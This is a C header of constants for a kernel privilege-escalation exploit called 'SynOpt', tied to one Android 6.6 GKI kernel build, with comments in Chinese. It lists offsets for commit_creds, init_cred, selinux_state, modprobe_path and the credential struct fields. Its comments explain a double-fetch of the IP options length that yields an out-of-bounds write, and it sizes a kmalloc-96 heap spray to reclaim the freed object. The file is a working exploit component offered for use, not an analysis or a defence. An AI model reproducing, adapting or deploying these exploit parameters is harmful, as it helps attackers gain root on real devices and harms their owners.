/*
 * synopt_offsets.h — SynOpt（CVE-2026-98432）的构建相关常量
 *
 * 全部由这台机器的内核镜像（6.6.118-android15-8-gf72a02f47f4b-abogki551678766-4k）
 * 的 .symtab 与内嵌 BTF 导出，**不能跨构建复用**：换个 abogki 号，这些值全都不一样。
 *
 * 取法：
 *   O_*  —— nm -n k1.elf 拿绝对地址，减去 _text；
 *   S_*  —— 同一镜像的 BTF（__start_BTF..__stop_BTF）；
 *   ip_options 的两个字段偏移 —— BTF 没有这个结构体，从 ip_build_and_send_pkt
 *           与 ip_options_build 的指令里读出来（见下方注释）。
 *
 * 约定：
 *   O_* 是相对 _text 的偏移，运行期加 KASLR slide；
 *   S_* 是结构体内部字段偏移，与构建绑定。
 */

#ifndef SYNOPT_OFFSETS_H
#define SYNOPT_OFFSETS_H

#define SYNOPT_RELEASE "6.6.118-android15-8-gf72a02f47f4b-abogki551678766-4k"

/* ---- 全局符号（相对 _text，取自 k1.elf 的 .symtab） ---- */
#define O_IP_OPTIONS_BUILD         0x0e9ff9cULL
#define O_IP_BUILD_AND_SEND_PKT    0x0ea154cULL
#define O_TCP_V4_SEND_SYNACK       0x0ed0c78ULL
#define O_TCP_V4_SYN_RECV_SOCK     0x0ed0f04ULL
#define O_INET_CSK_ROUTE_REQ       0x0eae984ULL
#define O_INET_SOCK_DESTRUCT       0x0ef1968ULL
#define O_TCP_V4_REQSK_DESTRUCTOR  0x0ed0af0ULL
#define O_TCP_MAKE_SYNACK          0x0eca440ULL
#define O_KFREE                    0x0317a7cULL
#define O_KMALLOC                  0x031773cULL
#define O_COMMIT_CREDS             0x00e45e8ULL
#define O_PREPARE_KERNEL_CRED      0x00e4af4ULL
#define O_INIT_TASK                0x213e2c0ULL
#define O_INIT_CRED                0x2150788ULL
#define O_SELINUX_STATE            0x237a350ULL
#define O_MODPROBE_PATH            0x21cc888ULL
#define O_CORE_PATTERN             0x2201ae0ULL

/* ---- task_struct（BTF） ---- */
#define S_TASK_TASKS    0x550ULL
#define S_TASK_PID      0x618ULL
#define S_TASK_TGID     0x61cULL
#define S_TASK_REAL_CRED 0x818ULL
#define S_TASK_CRED     0x820ULL
#define S_TASK_COMM     0x830ULL

/* ---- struct cred（BTF，size 0xb8） ---- */
#define CRED_SIZE       0xb8ULL
#define S_CRED_UID      0x08ULL
#define S_CRED_GID      0x0cULL
#define S_CRED_SUID     0x10ULL
#define S_CRED_SGID     0x14ULL
#define S_CRED_EUID     0x18ULL
#define S_CRED_EGID     0x1cULL
#define S_CRED_FSUID    0x20ULL
#define S_CRED_FSGID    0x24ULL
#define S_CRED_SECUREBITS 0x28ULL
#define S_CRED_CAP_INH  0x30ULL
#define S_CRED_CAP_PERM 0x38ULL
#define S_CRED_CAP_EFF  0x40ULL
#define S_CRED_CAP_BSET 0x48ULL
#define S_CRED_CAP_AMB  0x50ULL
#define S_CRED_SECURITY 0x80ULL
#define S_CRED_USER     0x88ULL
#define S_CRED_USER_NS  0x90ULL
#define S_CRED_UCOUNTS  0x98ULL
#define S_CRED_GROUP_INFO 0xa0ULL

/* ---- struct inet_sock（BTF 里 inet_connection_sock.icsk_inet 在 0） ---- */
#define S_INET_OPT      0x370ULL

/* ---- struct skb_shared_info（BTF，size 0x168） ---- */
#define S_SKB_NR_FRAGS  0x02ULL
#define S_SKB_DATAREF   0x20ULL
#define S_SKB_DESTRUCTOR_ARG 0x28ULL
#define S_SKB_FRAGS     0x58ULL

/* ---- ip_options_rcu 的字段（反汇编得出，BTF 未收录这两个结构体） ----
 *
 * ip_build_and_send_pkt 的第 4 个参数是 `struct ip_options_rcu *`（记作 opt），
 * 它把同一个指针读了两次：
 *
 *   0xea158c  ldrb w9, [x23, #24]   ; 第一次 → 算 skb_push 的 headroom
 *   ...       skb_push(...)
 *   0xea1660  ldrb w8, [x23, #24]   ; 第二次 → 作为 memcpy 长度
 *   0xea166c  add  x1, x23, #0x10   ; 传 &opt->opt 给 ip_options_build
 *   0xea1688  bl   ip_options_build
 *
 * ip_options_build 内部（0xe9ffd8）：
 *
 *   ldrb w2, [x1, #8]     ; 长度 = ip_options.optlen
 *   add  x1, x1, #0x10    ; 源   = ip_options.__data
 *   bl   memcpy           ; 目的 = skb->head + network_header + 20
 *
 * 所以相对 ip_options_rcu 起点：
 *   +0x18 = ip_options.optlen（被读两次的那个字段）
 *   +0x20 = ip_options.__data
 * 两次读之间隔着 skb_push：让第二次读到更大的 optlen，memcpy 就会写穿
 * 第一次预留的头部 —— 这就是写原语的来源。
 */
#define S_RCU_OPT        0x10ULL  /* struct ip_options 在 rcu_head 之后 */
#define S_OPT_OPTLEN     0x18ULL  /* u8 optlen，相对 ip_options_rcu */
#define S_OPT_DATA       0x20ULL  /* u8 __data[40]，相对 ip_options_rcu */
#define S_OPT_FADDR      0x10ULL
#define S_OPT_NEXTHOP    0x14ULL
#define S_OPT_SRR        0x19ULL
#define S_OPT_RR         0x1aULL
#define S_OPT_TS         0x1bULL
#define S_OPT_FLAGS      0x1cULL
#define S_OPT_ROUTER_ALERT 0x1dULL
#define S_OPT_CIPSO      0x1eULL

/* ---- 漏洞对象的尺寸关系 ----
 *
 * 分配点是 kzalloc(sizeof(struct ip_options_rcu) + optlen)：
 *   sizeof(ip_options_rcu) = rcu_head(0x10) + ip_options(0x20) = 0x30
 *   optlen 40 → 0x30 + 40 = 88 → kmalloc-96；IP 选项上限就是 40。
 *
 * 所以喷射对象只要落在 kmalloc-96，就能占住被释放的槽位。 */
#define OPT_HDR_SIZE    0x30ULL
#define OPT_MAXLEN      40

/* ---- 喷射对象 ---- */
#define SPRAY_SIZE      96      /* kmalloc-96 */
#define SPRAY_DATA_OFF  0x20    /* 对象里 __data 的偏移 */
#define SPRAY_OPTLEN_OFF 0x18   /* 对象里 optlen 的偏移 */

#endif
